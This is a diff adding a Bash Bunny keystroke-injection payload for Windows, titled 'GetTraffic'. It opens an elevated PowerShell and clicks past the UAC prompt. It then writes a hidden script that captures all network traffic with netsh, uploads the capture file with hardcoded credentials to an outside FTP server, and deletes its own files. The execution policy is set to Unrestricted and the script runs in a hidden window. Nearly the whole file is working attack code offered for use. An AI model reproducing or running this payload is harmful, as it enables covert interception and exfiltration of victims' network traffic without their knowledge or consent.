@@ -1,0 +1,111 @@
+#!/bin/bash
+#
+# Title:         GetTraffic
+# Author:        samdeg555
+# Version:       1.0
+# Target:        Windows
+# 
+# Launches PowerShell as admin
+# Bypasses UAC
+# Creates a powershell script in the C:\temp\ directory called script.ps1 that captures all network traffic
+# for a specified amount of time. 
+# Allows powershell script execution. 
+# Start the script in background. 
+# The capture file is then sent to an FTP server. 
+#
+
+
+# === SETUP REQUIRED - PLEASE READ COMMENTS ===
+
+# Creds for the FTP server
+user="sam"
+pass="123456"
+
+# FTP server address
+server="myFTPserver.com"
+
+# Time (in seconds) for the capture to run
+scanTime="10"
+
+# === END OF SETUP ===
+
+
+# Initial setup of the BashBunny
+LED R 200
+ATTACKMODE HID
+
+# Change language accordingly
+Q SET_LANGUAGE ca
+
+# Start the attack
+LED B 200
+
+# Launch powershell as admin
+Q GUI r
+Q DELAY 100
+Q STRING powershell Start-Process powershell -Verb runAs
+Q ENTER
+
+# Bypass UAC
+Q DELAY 3000
+
+# You might need to change this to y if the computer is in english (o stands for "Oui" in french)
+Q ALT o
+Q ENTER
+Q DELAY 500
+
+# Creating directory
+Q STRING 'mkdir C:/temp'
+Q ENTER
+Q STRING 'cd C:/temp'
+Q ENTER
+
+#Creating script.ps1
+Q STRING 'echo '"'"'$dumpFile = $env:COMPUTERNAME+".etl"'"'"' > C:/temp/script.ps1'
+Q ENTER
+Q STRING 'echo '"'"'$cabFile = $env:COMPUTERNAME+".cab"'"'"' >> C:/temp/script.ps1'
+Q ENTER
+Q STRING 'echo '"'"'netsh trace start persistent=yes capture=yes tracefile=C:/temp/$dumpFile'"'"' >> C:/temp/script.ps1'
+Q ENTER
+Q STRING 'echo '"'"'Start-Sleep -s'
+Q SPACE
+Q STRING $scanTime
+Q STRING ''"'"' >> C:/temp/script.ps1'
+Q ENTER
+Q STRING 'echo '"'"'netsh trace stop'"'"' >> C:/temp/script.ps1'
+Q ENTER
+Q STRING 'echo '"'"'$webclient = New-Object System.Net.WebClient'"'"' >> C:/temp/script.ps1'
+Q ENTER
+Q STRING 'echo '"'"'$webclient.Credentials = New-Object System.Net.NetworkCredential("'
+Q STRING $user
+Q STRING '", "'
+Q STRING $pass
+Q STRING '")'"'"' >> C:/temp/script.ps1'
+Q ENTER
+Q STRING 'echo '"'"'$uri = New-Object System.Uri("ftp://'
+Q STRING $server
+Q STRING '/$dumpFile")'"'"' >> C:/temp/script.ps1'
+Q ENTER
+Q STRING 'echo '"'"'$webclient.UploadFile($uri, "C:/temp/$dumpFile")'"'"' >> C:/temp/script.ps1'
+Q ENTER
+Q STRING 'echo '"'"'del C:/temp/$dumpFile'"'"' >> C:/temp/script.ps1'
+Q ENTER
+Q STRING 'echo '"'"'del C:/temp/$cabFile'"'"' >> C:/temp/script.ps1'
+Q ENTER
+Q STRING 'echo '"'"'del C:/temp/script.ps1'"'"' >> C:/temp/script.ps1'
+Q ENTER
+
+# Changing the execution policy
+Q STRING 'Set-ExecutionPolicy Unrestricted'
+Q ENTER
+
+# You might need to change this to Y if the computer is in english (O stands for "Oui" in french)
+Q STRING O
+Q ENTER
+
+# Execute the script in background
+Q STRING 'powershell.exe -windowstyle hidden -file C:/temp/script.ps1'
+Q ENTER
+
+# LED is green, trap is clean. 
+LED G
